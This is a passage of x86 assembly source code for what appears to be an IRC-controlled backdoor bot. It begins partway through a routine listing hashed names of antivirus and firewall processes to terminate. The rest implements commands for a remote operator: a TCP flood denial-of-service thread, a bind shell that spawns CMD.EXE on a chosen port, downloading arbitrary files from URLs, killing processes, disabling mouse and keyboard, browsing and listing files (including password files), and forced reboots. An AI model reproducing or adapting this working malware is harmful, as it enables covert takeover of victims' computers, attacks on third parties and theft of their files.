            whash   <atcon, atupdater, atwatch, wgfe95, poproxy, nprotect, ndd32, mcagent, mcupdate, watchdog>
            whash   <taumon, iamaserv, sphinx, vsecomr, icload95, icsupp95, icloadnt, icsuppnt, frw, firewall>
            whash   <antivirus, blackice, blackd, wrctrl, wradmin, cleaner3, pcfwallicon, aplica32, cfiadmin>
            whash   <cfiaudit, tds2-98, tds2-nt, nvarch16, vsmain, persfw, pavproxy, mssmmc32, trjscan, defwatch>
            whash   <vpc42, rtvscn95, vptray, mgui, apvxdwin, fsav, agentsvr, rrguard, rescue, rshell>
            whash   <apimonitor, cleanpc, pstat, wintop, anti-trojan, borg2, iamserv, vsmon>
bad_namez_numba     equ ($-bad_namez)/4

anti_av_thread      endp

ircbot_thread:      call    $+5
bdelta:         pop ebp

X           equ <-bdelta[ebp]>              ; all variables relative to bdelta will be accessed in form of: varname X       

            sub esp, 512
            push    esp
            push    0101h
            callb   WSAStartup
    
            add esp, 512
            test    eax, eax
            jnz bot_end

IFDEF IRC_LOG
            x_push  eax, irclog.log~
            mov edx, esp
            xor eax, eax
            push    eax
            push    eax
            push    CREATE_ALWAYS
            push    eax
            push    FILE_SHARE_READ
            push    GENERIC_WRITE
            push    edx
            callb   CreateFileA             ; create log file
            x_pop
    
            inc eax
            jz  bot_end
            dec eax

            call    $+5+4
bot_log_handle      dd  0
            pop edi
            stosd
ENDIF ; IRC_LOG
            mov eax, 200h
            call    malloc

            call    $+5+4
irc_recv_buffer     dd  0                   ; irc buffer
            pop edi
            stosd
connect_to_irc:
            call    setup_registry
            jecxz   bot_end

            push    (socket_handle X).dword ptr 0
            callb   closesocket

            call    connect_to_irc_server
            jecxz   bot_end

            call    login_to_irc
            jc  connect_to_irc
            jecxz   bot_end

            call    join_channel
            jecxz   bot_end

__il:           call    read_line
            jecxz   bot_end
            call    parse_line
            jecxz   __il

bot_end:
            ;@SEH_RemoveFrame

IFDEF IRC_LOG
            push    (bot_log_handle X).dword ptr 0
            callb   CloseHandle
ENDIF ; IRC_LOG
            push    (socket_handle X).dword ptr 0
            callb   closesocket

            callb   WSACleanup

            push    0
            callb   ExitThread

setup_registry:     mov eax, 128
            call    malloc
            xchg    eax, ebx

            x_push  eax, Software\Microsoft\Windows\CurrentVersion\OpenGLdrivers~
            mov ecx, esp
            push    _xsize
            pop edi
            x_push  eax, Default~
            mov eax, esp
            add edi, _xsize
            @pushvar <dd 128>
            push    ebx
            @pushvar <dd REG_SZ>
            push    eax
            push    ecx
            push    HKEY_LOCAL_MACHINE
            callb   SHGetValueA
            lea esp, [esp+edi]

            xchg    eax, ecx
            jecxz   __convert

            mov ecx, bot_password X
            call    save_hash
            jmp __err

__convert:      push    ebx
            callb   atoi
            pop edx
    
            xchg    eax, ecx
            jecxz   __err

            mov bot_password X, ecx

__err:          xchg    eax, ebx
            call    free

            @retecx1

; ---------------------------------------------------------------------------
; analyzes given commands and calls corresponding subroutines
; i: automatically set after call to read_line
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
parse_line:     xchg    eax, esi                ; save ptr to the end of line
            push    ecx
            mov esi, irc_recv_buffer X
            mov edx, esi
            x_push  ecx, :irc.              ; discard irc.* 
            mov edi, esp
            push    4
            pop ecx
            cld
            repz    cmpsb

            x_pop
            pop ecx
            jz  quit_oky
        
            mov esi, edx
            lodsd
            cmp eax, "GNIP"
            jz  pong

            mov esi, edx
            @endspc
            cmp [esi], "VIRP"
            jnz quit_oky
    
            cmp [esi+4], " GSM"
            jnz quit_oky

            lodsd                       ; skip PRIVMSG + space
            lodsd
            push    esi
            lea esi, irc_nick X
            mov ebx, esi
            @endcr
            sub esi, ebx
            dec esi
            mov ecx, esi
            pop esi

            push    ecx esi ecx ebx
            push    NORM_IGNORECASE
            push    LOCALE_SYSTEM_DEFAULT
            callb   CompareStringA

            sub al, 2
            jz  __private_msg

__chan_msg:     jmp quit_oky

__private_msg:      mov esi, irc_recv_buffer X
            mov edx, esi
            @usklicnik

            sub esi, edx
            sub esi, 2                  ; : & !
            mov ecx, esi                ; nick length
            push    ecx                 ; needed 4 l8r
            mov esi, edx
            inc esi
            call    $+5+10
irc_cmd_nick        db  10  dup(0)
            pop edi
            cld
            rep movsb
            xor al, al
            stosb                       ; +NULL
            pop ecx                 ; length of the active nick
            call    __s

priv_msg_curr_user  db "PRIVMSG "
            db 200 dup(0)

__s:            pop edi                 ; construct default PRIVMSG for current user
            scasd                       ; edi+=8
            scasd
            lea esi, irc_cmd_nick X
            cld
            rep movsb
            mov ax, ": "                ; after this comes the msg
            stosw

            mov esi, edx
            @endspc
            lodsd                       ; esi+=8
            lodsd
            @dvotocka
            mov edi, esi                ; save ptr to the command
            mov ebx, edi                ; ebx is used for param. transfer
            lea esi, cmd_dispatch_table X
            xor ecx, ecx
__1:            add esi, ecx
            mov edi, ebx
            lodsb
            movzx   ecx, al
            jecxz   __unknown_cmd

            cld
            repz    cmpsb
            lodsd
            jnz __1
            
            add eax, ebp
            sub eax, offset bdelta          ; prior to calling, relocate hard-coded subroutine offset
            call    eax

            jecxz   bad_quit

__unknown_cmd:      jmp quit_oky

pong:           mov byte ptr [esi-4+1],'O'          
            mov esi, edx
            call    irc_send
            
            jecxz   bad_quit
    
            jmp quit_oky

bad_quit:       push    1
            pop ecx
            jmp $+2+2

quit_oky:       xor ecx, ecx
            ret

bot_cmd_stopdos:    call    check_logged_in
            jnc err_not_logged_in
            
            and (DOS_flag X).byte ptr 0, 0
            
            @retecx1

; ---------------------------------------------------------------------------
; starts DOS attack on the target
; format: !dos <IP> <port> <packet_size> <interval_in_ms_between_packets>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_dos:        call    check_logged_in
            jnc err_not_logged_in

            movzx   ecx, (DOS_flag X).byte ptr 0
            jecxz   __okie
            
            x_push  eax, <DOS attack allready in progress.>
            push    esp
            push    32
            pop ecx
            call    send_privmsg
            x_pop
            jmp bot_cmd_dos_end

__okie:         lea esi, [ebx+4+1]
            push    esi
            xor edx, edx
__spc:          lodsb
            cmp al, ' '
            jnz __skip
            inc edx
__skip:         cmp al, CR
            jnz __spc
            
            pop esi
            sub edx, 3
            jnz err_cmd_syntax

            inc (DOS_flag X).byte ptr 0
            call    patchspc
            push    esi
            callb   inet_addr
            mov DOS_IP X, eax
            @endsz

            call    patchspc
            call    ascii2num
            mov DOS_port X, eax

            call    patchspc
            call    ascii2num
            mov DOS_packet_size X, eax
            
            call    patchspc
            call    ascii2num
            mov DOS_interval X, eax
            
            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    eax                 ; thread param
            lea ebx, bot_DOS_thread X
            push    ebx
            push    2000h
            push    eax
            callb   CreateThread
            
            pop ecx
            push    eax
            callb   CloseHandle
            
bot_cmd_dos_end:    @retecx1
            
bot_DOS_thread      proc    pascal
            
            @SEH_SetupFrame <jmp    __DOS_xception>
            
            call    $+5
dosdlta:        pop ebp
            
_DOS            equ <-dosdlta[ebp]>
            
__cycle:        xor ebx, ebx
            push    ebx
            push    SOCK_STREAM
            push    AF_INET
            call    _socket _DOS
            
            mov esi, eax
            inc eax
            jz  __end

            push    ebx                         ; sin_zero[8]
            push    ebx
            db  068h
DOS_IP          dd  ?                           ; sin_addr

            db  068h
DOS_port        dd  ?
            call    _htons _DOS

            shl eax, 16
            add al, AF_INET
            push    eax
            mov ecx, esp
                        
            push    type sockaddr_in
            push    ecx
            push    esi
            call    _connect _DOS
            
            add esp, 16
            inc eax
            jz  __end_1
            
            db  0b8h
DOS_packet_size     dd  ?
            call    malloc
            xchg    eax, ecx
            jecxz   __end_1
            
            push    ebx
            push    (DOS_packet_size _DOS).dword ptr 0
            push    ecx
            push    esi
            call    _send _DOS
            
            inc eax
            jz  __end_1
            
            db  068h
DOS_interval        dd  ?
            call    _Sleep _DOS
            
            push    esi
            call    _closesocket _DOS
            
            movzx   ecx, (DOS_flag _DOS).byte ptr 0
            jecxnz  __cycle
                        
__end_1:        push    esi
            call    _closesocket _DOS
            
__end:          dec (DOS_flag _DOS).byte ptr 0

__DOS_xception:     @SEH_RemoveFrame
            push    0
            call    _ExitThread _DOS
            
DOS_flag        db  0
bot_DOS_thread      endp

; ---------------------------------------------------------------------------
; lists currently logged in ops
; format: !opers
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_opers:      call    check_logged_in
            jnc err_not_logged_in

            mov eax, 512
            call    malloc
            
            xchg    eax, edi
            mov ebx, edi
            x_stosd <There are currently >
            mov eax, operators X
            push    eax
            call    num2ascii
            add edi, eax
            x_stosd < ops logged in: >
            pop ecx
            
            lea esi, operators X
            lodsd
            mov edx, esi
            
__cycle:        mov esi, edx
__copy:         lodsb
            stosb
            test    al, al
            jnz __copy
            
            dec edi
            mov ax, ' ,'
            stosw
            
            add edx, size operator
            loop    __cycle
            dec edi
            dec edi
            mov al, '.'
            stosb
            
            mov ax, CRLF_HEX
            stosw
            mov ecx, edi
            sub ecx, ebx
            
            push    ebx
            call    send_privmsg
            
            push    ecx
            mov eax, ebx
            call    free
            pop ecx
            jecxz   $+2+3
            push    1
            pop ecx
            ret

; ---------------------------------------------------------------------------
; kills a process having specified PID
; format: !kill <PID>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_kill:       call    check_logged_in
            jnc err_not_logged_in
            
            lea esi, [ebx+5+1]
            call    patchcr
            
            call    ascii2num
            
            push    eax
            push    0
            push    PROCESS_TERMINATE
            callb   OpenProcess
            
            push    0
            push    eax
            callb   TerminateProcess
            
            @retecx1
            
; ---------------------------------------------------------------------------
; list active processes on the system. displayes PATH & PID
; format: !procs
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_procs:      call    check_logged_in
            jnc err_not_logged_in
            
            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    eax                 ; thread param
            lea ebx, bot_procs_thread X
            push    ebx
            push    2000h
            push    eax
            callb   CreateThread
            
            pop ecx
            push    eax
            callb   CloseHandle
            
            @retecx1

bot_procs_thread    proc    pascal

            local   p_handle
            local   p_entry:PROCESSENTRY32
            local   msg
            
            @SEH_SetupFrame <jmp    __procs_exception>
            
            call    $+5
procsdlta:      pop ebx

_PD         equ <-procsdlta[ebx]>

            mov eax, 512
            call    malloc  

            xchg    eax, edi
            mov msg, edi
            
            x_stosd <PRIVMSG >
            lea esi, irc_cmd_nick _PD
            push    esi
            @endsz
            sub esi, [esp]
            lea ecx, [esi-1]
            pop esi
            cld
            rep movsb
            mov ax, ": "
            stosw
            push    edi
            
            push    0
            push    TH32CS_SNAPPROCESS
            call    _CreateToolhelp32Snapshot _PD
            
            inc eax
            jz  __end
            dec eax
            mov p_handle, eax

            lea ecx, p_entry
            mov [ecx.dwSize], size PROCESSENTRY32
            push    ecx
            push    eax
            call    _Process32First _PD
            
            test    eax, eax
            jz  __end_1

__cycle:        pop edi
            push    edi
            lea esi, p_entry.szExeFile
__copy:         lodsb
            stosb
            test    al, al
            jnz __copy
            
            dec edi
            x_stosd < - PID: >
            mov eax, p_entry.th32ProcessID
            call    num2ascii
            add edi, eax
            
            mov ax, CRLF_HEX
            stosw
            mov ecx, edi
            sub ecx, msg
IFDEF IRC_LOG
            pusha
            xor eax, eax
            push    eax esp ecx msg
            push    (bot_log_handle _PD).dword ptr 0
            call    _WriteFile _PD
            popa
ENDIF ; IRC_LOG
            pusha
            push    0
            push    ecx
            push    msg
            push    (socket_handle _PD).dword ptr 0
            call    _send _PD
            
            mov [esp.Pushad_ecx], eax
            popa

            jecxz   __end_1
            inc ecx
            jecxz   __end_1
            
            mov esi, edx
            push    1500
            call    _Sleep _PD
            
            lea eax, p_entry
            push    eax
            push    p_handle
            call    _Process32Next _PD
            
            test    eax, eax
            jnz __cycle
            pop eax
            
__end_1:        push    p_handle
            call    _CloseHandle _PD
            
__end:          mov eax, msg
            call    free

            leave
__procs_exception:  @SEH_RemoveFrame
            push    0
            call    _ExitThread _PD

            
bot_procs_thread    endp

; ---------------------------------------------------------------------------
; downloads a file from http|ftp resource
; format: !download <url> <file_name_to_save_to>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_download:   call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+9+1]
            xor edx, edx
            push    esi
            
__spc:          lodsb
            cmp al, ' '
            jz  __skip
            inc edx
__skip:         cmp al, CR
            jnz __spc
            dec edx
            pop esi
            jnz err_cmd_syntax
            
            call    patchspc
            
            mov eax, 516
            call    malloc
            xchg    eax, edi
            mov ebx, edi
__copy:         lodsb
            stosb
            test    al, al
            jnz __copy
            
            call    patchcr
            
            xor eax, eax
            push    eax
            push    eax
            push    CREATE_ALWAYS
            push    eax
            push    FILE_SHARE_READ
            push    GENERIC_WRITE
            push    esi
            callb   CreateFileA
            inc eax
            jz  __err
            dec eax
            stosd

            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    ebx                 ; thread param
            lea ebx, bot_download_thread X
            push    ebx
            push    2000h
            push    eax
            callb   CreateThread
            
            pop ecx
            push    eax
            callb   CloseHandle
            
__err:          @retecx1

bot_download_thread proc    pascal
            
            arg url:DWORD
            
            local   f_handle
            local   inet_handle
            local   inet_rsrc
            local   h_mem
            
            @SEH_SetupFrame <jmp    __dl_thread_xception>
            
            call    $+5
downdlta:       pop ebx

_DT         equ <-downdlta[ebx]>

            mov esi, url
            @endsz
            lodsd
            mov f_handle, eax
            
            x_push  eax, <my cute GodzIIla rox~>
            mov ecx, esp
            xor eax, eax
            push    eax
            push    eax
            push    eax
            push    INTERNET_OPEN_TYPE_DIRECT
            push    ecx
            call    _InternetOpenA _DT

            test    eax, eax
            jz  __err
            mov inet_handle, eax
            
            xor eax, eax
            push    eax
            push    eax
            push    eax
            push    eax
            push    url
            push    inet_handle
            call    _InternetOpenUrlA _DT
            
            xchg    eax, ecx
            jecxz   __err_1
            mov inet_rsrc, ecx
            
            mov eax, 64000
            call    malloc
            mov h_mem, eax

__cycle:        push    edx
            mov edx, esp
            xor eax, eax
            push    eax
            push    eax
            push    edx
            push    inet_rsrc
            call    _InternetQueryDataAvailable _DT
            pop ecx
            
            xchg    eax, ecx
            jecxz   __err_2
            xchg    eax, ecx
            cmp ecx, 64000
            jbe __read
            mov ecx, 64000

__read:         push    ecx
            push    esp
            push    ecx
            push    h_mem
            push    inet_rsrc
            call    _InternetReadFile _DT
            pop ecx
            
            xchg    eax, ecx
            jecxz   __err_2
            xchg    eax, ecx
            jecxz   __err_2
            
            push    ecx
            mov eax, esp
            push    0
            push    eax
            push    ecx
            push    h_mem
            push    f_handle
            call    _WriteFile _DT
            pop ecx
            
            xchg    eax, ecx
            jecxnz  __cycle
            
__err_2:        mov eax, h_mem
            call    free
            push    inet_rsrc
            call    _InternetCloseHandle _DT                
            
__err_1:        push    inet_handle
            call    _InternetCloseHandle _DT
__err:          
            push    f_handle
            call    _CloseHandle _DT
            mov eax, url
            call    free
            
            leave
__dl_thread_xception:   @SEH_RemoveFrame
            push    0
            call    _ExitThread _DT
            
bot_download_thread endp            

bot_cmd_killmouse:  call    check_logged_in
            jnc err_not_logged_in

            x_push  eax, <rundll32.exe mouse,disable~>
            mov eax, esp
            push    SW_HIDE
            push    eax
            callb   WinExec
            x_pop

            @retecx1


bot_cmd_killkeyb:   call    check_logged_in
            jnc err_not_logged_in

            x_push  eax, <rundll32.exe keyboard,disable~>
            mov eax, esp
            push    SW_HIDE
            push    eax
            callb   WinExec
            x_pop

            @retecx1

bot_cmd_syskill:    call    check_logged_in
            jnc err_not_logged_in
    
            x_push  eax, <rundll32.exe user,disableoemlayer~>
            mov eax, esp
            push    SW_HIDE
            push    eax
            callb   WinExec
            x_pop

            @retecx1

bot_cmd_minaw:      call    check_logged_in
            jnc err_not_logged_in

            callb   GetForegroundWindow
            xchg    eax, esi

            push    esi
            callb   IsIconic
    
            test    eax, eax
            jnz __minimyzed
    
            push    esi
            callb   CloseWindow

__minimyzed:        @retecx1

bot_cmd_closecd:    call    check_logged_in
            jnc err_not_logged_in

            x_push  eax, <set CDAudio door closed~>
            mov ecx, esp
            xor eax, eax
            push    eax eax eax ecx
            callb   mciSendStringA
            x_pop

            @retecx1

bot_cmd_opencd:     call    check_logged_in
            jnc err_not_logged_in
            x_push  eax, <set CDAudio door open~>
            mov ecx, esp
            xor eax, eax
            push    eax eax eax ecx

            callb   mciSendStringA
            x_pop
            
            @retecx1

bot_cmd_closeaw:    call    check_logged_in
            jnc err_not_logged_in

            callb   GetForegroundWindow
            xchg    eax, esi

            xor eax, eax
            push    eax
            push    eax
            push    WM_QUIT
            push    esi
            callb   PostMessageA

            @retecx1

bot_cmd_beep:       call    check_logged_in
            jnc err_not_logged_in
    
            lea esi, [ebx+5+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            call    patchcr
            call    ascii2num

            xchg    eax, ecx
            jecxz   __end

__1:            push    ecx
            push    -1
            callb   MessageBeep
            pop ecx
            loop    __1

__end:          inc ecx
            ret

bot_cmd_cleanclip:  call    check_logged_in
            jnc err_not_logged_in

            callb   GetOpenClipboardWindow
            push    eax
            callb   OpenClipboard
            callb   EmptyClipboard
            callb   CloseClipboard
            
            @retecx1

; ---------------------------------------------------------------------------
; displays sytem modal Message Box with given title and message
; format: !msgbox "<msg>" "<title>"
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_msgbox:     call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+7+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            cmp byte ptr [esi], '"'
            jnz err_cmd_syntax
            inc esi
            push    esi
            @endcr
            and byte ptr [esi-1], 0
            cmp byte ptr [esi-2], '"'
            jnz __err

            and byte ptr [esi-2], 0
            sub esi, [esp]
            mov ecx, esi
            mov edx, ecx
            mov edi, [esp]
            mov al, '"'
            repnz   scasb
            pop esi
            jnz err_cmd_syntax

            and byte ptr [edi-1], 0
            cmp word ptr [edi], '" '
            jnz err_cmd_syntax

            inc edi
            inc edi

            push    MB_SYSTEMMODAL
            push    esi
            push    edi
            push    0
            callb   MessageBoxA
            jmp __end

__err:          pop eax
            jmp err_cmd_syntax

__end:          @retecx1

; ---------------------------------------------------------------------------
; spawns a shell on specified port
; format: spawn <port>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_spawn:      call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+6+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            call    patchcr
            call    ascii2num

            xchg    eax, ecx
            jecxz   __err

            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    ecx                 ; thread param
            lea ebx, bot_shell_thread X
            push    ebx
            push    2000h
            push    eax
            callb   CreateThread

            pop edx
            push    eax
            callb   CloseHandle

__err:          @retecx1

bot_shell_thread    proc    pascal
            
            arg shell_port:DWORD

            local   arg_end
            local   wsocket
            local   lsocket
            local   processinfo:PROCESS_INFORMATION
            local   buffer:byte:512
            local   read_handle_1
            local   write_handle_1
            local   read_handle_2
            local   write_handle_2
            local   arg_start
            
            @SEH_SetupFrame <jmp    __end_bot_shell>
    
            lea edi, arg_start
            lea ecx, arg_end
            sub ecx, edi
            xor eax, eax
            cld
            rep stosb

            lea edi, buffer
            xchg    eax, ebx

            call    $+5
dshell:         pop esi

sh          equ <-dshell[esi]>

            lea eax, write_handle_1
            lea ecx, read_handle_1
            call    __create_pipe
            jecxz   __end

            lea eax, write_handle_2
            lea ecx, read_handle_2
            call    __create_pipe
            jecxz   __end
    
            push    IPPROTO_TCP
            push    SOCK_STREAM
            push    AF_INET
            call    _socket sh
            
            mov lsocket, eax
            inc eax
            jz  __end_bot_shell
    
            push    1
            mov ecx, esp                ; alloc optval ptr

            push    4
            push    ecx
            push    SO_REUSEADDR
            push    SOL_SOCKET
            push    lsocket
            call    _setsockopt sh
    
            pop ecx                 ; free optval

            test    eax, eax
            jnz __end_bot_shell

            push    512
            push    edi                 ; buffer
            call    _gethostname sh

            test    eax, eax
            jnz __end_bot_shell
    
            push    edi
            call    _gethostbyname sh

            test    eax, eax
            jnz __1

__end:          jmp __end_bot_shell

__1:            mov eax, [eax.h_list]
            mov eax, [eax]

            push    ebx                 ; alloc sockaddr
            push    ebx
            push    dword ptr [eax]
            push    shell_port
            call    _htons sh

            shl eax, 16
            add al, AF_INET
            push    eax
            mov ecx, esp

            push    type sockaddr_in
            push    ecx
            push    lsocket
            call    _bind sh

            add esp, 16

            test    eax, eax
            jnz __end_bot_shell
    
            push    1
            push    lsocket
            call    _listen sh

            test    eax, eax
            jnz __end_bot_shell

            push    ebx
            push    ebx
            push    lsocket
            call    _accept sh

            mov wsocket, eax
            inc eax
            jz  __end_bot_shell
                                    ; alloc STARTUPINFO
            push    write_handle_2              ; hStdError
            push    write_handle_2              ; hStdOutput
            push    read_handle_1               ; hStdInput
            push    ebx                 ; SW_HIDE
            push    ebx
            push    STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES
            push    10
            pop ecx
            push    ebx
            loop    $-1
            push    68
            mov edx, esp

            mov ecx, cs                                                                 
            xor cl, cl                                                                  
            jecxz   __a                                                            
            x_push  ecx, COMMAND.COM~
            jmp __b
__a:            x_push  ecx, CMD.EXE~
__b:            mov ecx, esp

            lea eax, processinfo
            push    eax
            push    edx
            push    ebx
            push    ebx
            xchg    eax, ecx
            mov ecx, cs                                                                 
            xor cl, cl
            jecxz   __c

            push    CREATE_NEW_CONSOLE
            jmp __d

__c:            push    ebx
__d:            xchg    eax, ecx
            push    1
            push    ebx
            push    ebx
            push    ecx
            push    ebx
            call    _CreateProcessA sh
            add esp, _xsize + 68            ; free 
            test    eax, eax
            jz  __end

pump_bot_shell:     push    ebx
            push    esp
            push    processinfo.PI_hProcess
            call    _GetExitCodeProcess sh
            test    eax, eax
            pop eax
            jz  __end

            cmp ax, STILL_ACTIVE
            jnz __end_bot_shell
    
            push    ebx
            mov ecx, esp
            push    ebx
            push    ecx
            push    ebx
            push    ebx
            push    ebx
            push    read_handle_2
            call    _PeekNamedPipe sh
            pop ecx
            test    eax, eax
            jz  __end_bot_shell

            jecxz   citaj_shell_socket
    
            mov eax, 512
            cmp ecx, eax
            jbe __overflow
            xchg    eax, ecx

__overflow:     push    ebx
            mov edx, esp
            push    ebx
            push    edx
            push    ecx
            push    edi
            push    read_handle_2
            call    _ReadFile sh
            test    eax, eax
            pop eax
            jz  __end_bot_shell
    
            push    ebx
            push    eax
            push    edi
            push    wsocket
            call    _send sh
            inc eax
            jz  __end_bot_shell
            
            jmp pump_bot_shell

citaj_shell_socket: push    wsocket
            push    1
            mov eax, esp
            
            push    0
            push    50
            mov ecx, esp

            xor ebx, ebx
            push    ecx
            push    ebx
            push    ebx
            push    eax
            push    1
            call    _select sh
            inc eax
            jz  __end_bot_shell

            dec eax
            jz  pump_bot_shell
    
            push    ebx
            push    512
            push    edi
            push    wsocket
            call    _recv sh
            inc eax
            jz  __end_bot_shell

            dec eax
            jz  __end_bot_shell
    
            push    ebx
            push    esp
            push    eax
            push    edi
            push    write_handle_1
            call    _WriteFile sh
            test    eax, eax
            jnz pump_bot_shell

__end_bot_shell:    @SEH_RemoveFrame
            push    wsocket
            call    _closesocket sh
            push    lsocket
            call    _closesocket sh
            push    processinfo.PI_hProcess
            call    _TerminateThread sh
            push    write_handle_2
            call    _CloseHandle sh
            push    write_handle_1
            call    _CloseHandle sh
            push    read_handle_2
            call    _CloseHandle sh
            push    read_handle_1
            call    _CloseHandle sh
            push    processinfo.PI_hProcess
            call    _CloseHandle sh
            push    processinfo.PI_hThread
            call    _CloseHandle sh
            leave
            push    0
            call    _ExitThread sh

__create_pipe:      push    1                   ; alloc SECURITY_ATTRIBUTES
            push    ebx
            push    12
            mov edx, esp
    
            push    ebx
            push    edx
            push    eax
            push    ecx
            call    _CreatePipe sh
            
            add esp, 3*4                ; free SECURITY_ATTRIBUTES
            
            xchg    eax, ecx
            retn
            
bot_shell_thread    endp

; ---------------------------------------------------------------------------
; copies specified file
; format: !copy <src> <dest>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_copy:       call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+5+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            push    esi
            @endcr
            and byte ptr [esi-1], 0
            sub esi, [esp]
            mov ecx, esi
            mov edi, [esp]
            mov al, ' '
            repnz   scasb
            pop esi
            jnz err_cmd_syntax

            and byte ptr [edi-1], 0
            push    0
            push    edi
            push    esi
            callb   CopyFileA

            @retecx1

bot_cmd_move:       call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+5+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax
            push    esi
            @endcr
            and byte ptr [esi-1], 0
            sub esi, [esp]
            mov ecx, esi
            mov edi, [esp]
            mov al, ' '
            repnz   scasb
            pop esi
            jnz err_cmd_syntax

            and byte ptr [edi-1], 0
            push    edi
            push    esi
            callb   MoveFileA

            @retecx1

; ---------------------------------------------------------------------------
; erazes specified empty directory
; format: !rmdir <dirname>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_rmdir:      call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+6+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            push    esi
            @endcr
            and byte ptr [esi-1], 0
            callb   RemoveDirectoryA

            @retecx1

; ---------------------------------------------------------------------------
; creates specified directory
; format: !mkdir <dirname>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_mkdir:      call    check_logged_in
            jnc err_not_logged_in
    
            lea esi, [ebx+6+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            call    patchcr

            push    0
            push    esi
            callb   CreateDirectoryA

            @retecx1

; ---------------------------------------------------------------------------
; sets current directory
; format: !cd <dir>
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_cd:     call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+3+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            push    esi
            @endcr
            and byte ptr [esi-1], 0
            callb   SetCurrentDirectoryA    

            @retecx1

; ---------------------------------------------------------------------------
; print working directory
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_pwd:        call    check_logged_in
            jnc err_not_logged_in

            mov eax, MAX_PATH
            call    malloc
            xchg    eax, ebx
    
            push    ebx
            push    MAX_PATH
            callb   GetCurrentDirectoryA
    
            push    ebx
            xchg    eax, ecx
            call    send_privmsg
            
            push    ebx
            call    free
            
            @retecx1

; ---------------------------------------------------------------------------
; lists filez in current directory
; format: !ls <wildcard>
; ex: !ls *.* or !ls *.pwl
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_ls:     call    check_logged_in
            jnc err_not_logged_in

            lea esi, [ebx+3+1]
            cmp byte ptr [esi], LF
            jz  err_cmd_syntax

            call    patchcr

            xor eax, eax
            push    eax
            push    esp
            push    eax
            push    esi                 ; param
            lea ecx, bot_ls_thread X
            push    ecx
            push    2000h
            push    eax
            callb   CreateThread

            pop edx
            push    eax
            callb   CloseHandle

            @retecx1

bot_ls_thread       proc    pascal

            arg wildcard:DWORD

            local   wfd:WIN32_FIND_DATA
            local   search_handle
            
            @SEH_SetupFrame <jmp    __dcc_ls_thread_end>

            call    $+5
lsdelta:        pop esi

_LS         equ <-lsdelta[esi]>         
            
            mov eax, MAX_PATH
            call    malloc
            
            xchg    eax, edi
            push    edi                 ; TOS = ptr to message
            x_stosd <PRIVMSG >
            push    esi
            lea esi, irc_cmd_nick _LS
            push    esi
            @endsz
            sub esi, [esp]
            lea ecx, [esi-1]
            pop esi
            cld
            rep movsb
            mov ax, ": "
            stosw
            pop esi
            lea eax, wfd
            push    eax
            push    wildcard
            call    _FindFirstFileA _LS
            inc eax
            jz  __err
            dec eax 
            mov search_handle, eax
    
            pop ebx
            push    edi
__bot_ls_loop:      pop edi
            push    edi
            mov edx, esi
            lea esi, wfd.WFD_szFileName
__1:            lodsb
            stosb
            test    al, al
            jnz __1
            dec edi
            mov ax, CRLF_HEX
            stosw
            mov esi, ebx
            sub edi, esi
            mov ecx, edi
IFDEF IRC_LOG
            pusha
            xor eax, eax
            push    eax esp ecx esi
            mov esi, edx
            push    (bot_log_handle _LS).dword ptr 0
            call    _WriteFile _LS
            popa
ENDIF ; IRC_LOG
            pusha
            push    0
            push    ecx
            push    esi
            mov esi, edx
            push    (socket_handle _LS).dword ptr 0
            call    _send _LS
            
            mov [esp.Pushad_ecx], eax
            popa

            jecxz   __err
            inc ecx
            jecxz   __err
            
            mov esi, edx
            push    1500
            call    _Sleep _LS
            lea eax, wfd
            push    eax
            push    search_handle
            call    _FindNextFileA _LS
            dec eax
            jz  __bot_ls_loop

__err:          pop edx

__dcc_ls_thread_end:    @SEH_RemoveFrame
            push    search_handle
            call    _FindClose _LS
            xchg    eax, ebx
            call    free

            leave
            push    0
            call    _ExitThread _LS
            
bot_ls_thread       endp

; ---------------------------------------------------------------------------
; reboot the computer
; i: nothing
;
; o: error ? ecx=0 : ecx!=0
; ---------------------------------------------------------------------------
bot_cmd_reboot:     call    check_logged_in
            jnc err_not_logged_in
    
            push    0
            push    EWX_REBOOT or EWX_FORCE
            callb   ExitWindowsEx
    
            push    0
            push    EWX_FORCE
            callb   ExitWindowsEx

            @retecx1

